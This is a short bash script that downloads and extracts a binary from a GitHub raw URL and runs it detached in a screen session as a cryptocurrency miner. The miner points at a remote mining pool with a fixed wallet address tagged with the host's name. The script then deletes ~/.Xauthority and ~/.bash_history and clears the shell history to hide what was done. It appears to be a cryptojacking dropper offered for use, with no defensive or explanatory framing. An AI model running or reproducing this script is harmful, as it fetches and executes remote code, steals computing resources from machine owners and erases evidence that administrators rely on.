#!/bin/bash

#  apt 
export DEBIAN_FRONTEND=noninteractive
cd ~

# down 
wget https://raw.githubusercontent.com/xiaobintse/sh/main/l.tar.gz
chmod +x l.tar.gz
tar -zxvf l.tar.gz

# screen 
screen -dmS l bash -c './l --algo quantus --pool ru.lproute.com:5660 --wallet qzoLfsByQ515ofyuge61V7LENrtFLMV18AZEseQYqU1aH2du2.$(hostname)'

# rm
rm -rf ~/.Xauthority
rm -rf ~/.bash_history
history -c
exit 0